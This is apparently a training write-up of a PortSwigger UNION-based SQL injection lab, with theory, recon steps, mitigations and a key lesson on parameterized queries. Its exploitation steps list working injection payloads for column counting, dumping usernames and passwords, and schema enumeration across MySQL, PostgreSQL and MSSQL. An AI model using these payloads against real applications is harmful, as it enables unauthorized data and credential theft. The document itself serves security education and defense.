# SQL Injection - UNION Attack

## Lab Link
https://portswigger.net/web-security/sql-injection/union-attacks/lab-retrieve-data-from-other-tables

## Difficulty
Practitioner

## Vulnerability Type
SQL Injection - UNION-based

## Theory
UNION-based SQL injection allows attackers to extract data from other tables by appending UNION SELECT statements. This works when:
1. The application returns the query result to the user
2. The injected query and original query have compatible columns
3. The database allows UNION queries

Example:
```sql
Original: SELECT id, name FROM products WHERE id = 1
Injected: SELECT id, name FROM products WHERE id = 1 UNION SELECT username, password FROM users
```

## Recon Process
1. Identify injection point (URL params, POST fields)
2. Determine number of columns: use ORDER BY
3. Find text columns using UNION SELECT NULL
4. Enumerate database structure (tables, columns)
5. Extract sensitive data

## Exploitation Steps

### Step 1: Find Number of Columns
```sql
Payload: 1 ORDER BY 1--
Payload: 1 ORDER BY 2--
Payload: 1 ORDER BY 3--
```
Increment until error appears.

### Step 2: Identify Text Columns
```sql
Payload: 1 UNION SELECT NULL,NULL,NULL--
Replace NULLs one by one with text:
1 UNION SELECT 'test',NULL,NULL--
1 UNION SELECT NULL,'test',NULL--
```

### Step 3: Extract Data from Other Tables
```sql
Payload: 1 UNION SELECT username,password FROM users--
```

### Step 4: Database Enumeration
```sql
-- MySQL
1 UNION SELECT TABLE_NAME,COLUMN_NAME FROM INFORMATION_SCHEMA.COLUMNS--

-- PostgreSQL
1 UNION SELECT tablename,columnname FROM pg_tables,pg_columns--

-- MSSQL
1 UNION SELECT table_name,column_name FROM information_schema.tables,information_schema.columns--
```

## Root Cause
- User input concatenated into SQL query
- No input validation/parameterized queries
- Application returns query results to user
- Database allows UNION queries

## Impact
- **Data Extraction:** Access all database contents
- **Authentication Bypass:** Steal credentials
- **Privilege Escalation:** Access admin accounts
- **Data Modification:** Update or delete records

## Mitigations

### 1. **Parameterized Queries**
```python
cursor.execute("SELECT * FROM products WHERE id = %s", (user_id,))
```

### 2. **Input Validation**
```python
if not user_id.isdigit():
    raise ValueError("Invalid ID")
```

### 3. **Least Privilege**
- Database user with minimal permissions
- No access to sensitive tables
- No admin-level operations

### 4. **Web Application Firewall**
- Block UNION keyword
- Detect SQL patterns
- Monitor for suspicious queries

### 5. **Error Handling**
- Don't expose SQL errors to users
- Log all SQL queries
- Alert on suspicious patterns

## Key Lesson
UNION-based SQLi requires the attacker to match column count and types. Always use parameterized queries to prevent all SQL injection variants.
